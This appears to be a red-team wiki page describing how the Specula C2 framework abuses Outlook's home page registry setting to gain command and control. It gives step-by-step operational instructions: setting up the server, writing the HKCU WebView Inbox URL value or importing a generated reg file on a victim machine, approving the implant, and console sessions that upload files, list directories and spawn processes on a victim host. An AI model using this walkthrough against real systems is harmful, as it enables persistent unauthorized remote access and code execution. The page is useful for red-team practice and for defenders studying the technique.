# Outlook Home Page Abuse (Specula)

## Theory

[Specula ](https://github.com/trustedsec/specula)is a framework designed to enable interactive operations of an implant within the context of Outlook. It achieves this by setting a custom Outlook homepage via registry keys that call out to an interactive Python web server. This web server serves custom patched VBScript files that execute a command and return a string response.

Despite the belief that the Outlook home page functionality had been patched ([CVE-2017-11774](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-11774)), it was discovered that the associated Registry values continue to be utilized by Outlook, even in current Office 365 installs.

To establish a C2 channel, an attacker can modify a single non-privileged Registry key, creating the `REG_SZ` value of `URL` under `HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox` and pointing it to the validation URL on the Specula server:

## Practice

{% tabs %}
{% tab title="Setting up" %}
You can use IP addresses, but a recommendation is to use a DNS record. In this example we are going to use DNS. Start by pointing a DNS record towards your public IP of the server you will be using as a Specula server. Let us pretend that we created an A-record named demo.specula.com with the value of our public IP.

**HTTPS**

If you are planning to use SSL (Recommended) you will need to request the certificates. This guide shows how to do that with free let's encrypt certificates. We first need to install certbot:

```
apt install certbot
```

Next you want to make sure that you have allowed inbound communication on port 80/443. Then we request a certificate using the example of demo.specula.com (change this to your environment):

```
certbot certonly --non-interactive --agree-tos --email <SOME EMAIL ADDRESS> --standalone --preferred-challenges http -d demo.specula.com
```

This will produce certificate files so note down the paths to them, since you will need to reference them when starting Specula for the first time. In our example we want to keep these lines:

```
/etc/letsencrypt/live/demo.specula.com/fullchain.pem
/etc/letsencrypt/live/demo.specula.com/privkey.pem
```

The path to fullchain.pem will be the input when Specula asks for the _cert\_file_ as part of the startup and the privkey.pem will be to the _key\_file_.

**Setting up Specula**

First you should install a python virtual environment. You can of course install to the global package root, but this can cause issues that are later hard to diagnose.

If you're unfamiliar with python virtual environments and just want to know what to type a basic install would look like

```
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**Starting Specula**

```
sudo python specula.py
```

Since this is the first time you are starting Specula it will ask you for a variety of options, which will then be stored and used for future runs. The settings will be stored in a file called _specConfig.ini_. If you ever want to reset your settings and start over this file can be removed.
{% endtab %}

{% tab title="Hook an agent" %}
#### Edit Registry

To hook an agent, all you need to do is to create the registry `REG_SZ` value of `URL` under `HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox` and add the value pointing to your validation url on the Specula server.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

To avoid issues with ActiveX, it is recommended to adjust a few settings. Users can generate a full reg file with the recommended settings by running `generatehooker` from the root of the Specula menu. This reg file can then be copied to a Windows client with Outlook and imported. To ensure the registry key takes effect, Outlook should be stopped and restarted if it is running.

```
SpeculaC2> generatehooker 
```

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

#### Approve Agent

The agent should now show up in Specula and depending on setup, you will either need to approve it manually (if initial\_checkin\_count is set to 0) or you will have to wait until the necessary checkins have been reached before Specula will generate an encryption key and send back to the agent. On the Outlook side when everything is completed, it will change view from Inbox to Calendar. Once you change view back to Inbox you have a fully Specula agent running.

```powershell
# List agents
SpeculaC2> agents
id  hostname:username             ip address        refreshTime  Lastseen              approved    encryptionkey            api installed/verified
1   DEMO-VICTIME-PC:User           192.168.206.172   10           08/14/2024-11:50:56   NO (Checkin: 2 of 0)N/A                      False/False

# Approve Agent
SpeculaC2> approveAgent 1
Agent will be approved on next callback
```
{% endtab %}

{% tab title="Execute" %}
#### Select Agent

In order to assign tasks to agents and execute code, we first need to select it

```powershell
# List agents
id  hostname:username             ip address        refreshTime  Lastseen              approved    encryptionkey            api installed/verified
1   DEMO-VICTIME-PC:User          192.168.206.172   10           08/14/2024-11:51:21   YES         HNjPsC0pruHvYPTTZVXpAA   False/False

# Select agent
SpeculaC2> interact 1
```

#### Execute a module

```powershell
# Upload a file
SpeculaC2:hostname>usemodule operation/file/put_file
SpeculaC2:hostname:operation/file/put_file>set file /tmp/file2upload.txt
SpeculaC2:hostname:operation/file/put_file>set destination c:\temp\file2upload.txt
SpeculaC2:hostname:operation/file/put_file>run
Module operation/file/put_file added to execution queue
SpeculaC2:hostname>07/24/2024-08:02:30 - Finished uploading file to hostname at c:\temp\file2upload.txt - Sizes match: server:7 - agent:7

# Directory listing
SpeculaC2:hostname>usemodule operation/file/list_dir
SpeculaC2:hostname:operation/file/list_dir>set directory c:\temp
SpeculaC2:hostname:operation/file/list_dir>run
Module operation/file/list_dir added to execution queue
SpeculaC2:hostname>data
07/24/2024-07:59:29 -- operation/file/list_dir
Parent Folder: c:\temp
F: C:\temp\importantfile.txt - Size: 0mb - LastModified: 7/22/2024 1:19:18 PM

# Spawn a process
SpeculaC2:hostname>usemodule execute/host/spawnproc_explorer
SpeculaC2:hostname:execute/host/spawnproc_explorer>set command c:\windows\system32\msiexec.exe
SpeculaC2:hostname:execute/host/spawnproc_explorer>set arguments /?
SpeculaC2:hostname:execute/host/spawnproc_explorer>run
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://trustedsec.com/resources/tools/specula" %}

{% embed url="https://github.com/trustedsec/specula/wiki" %}
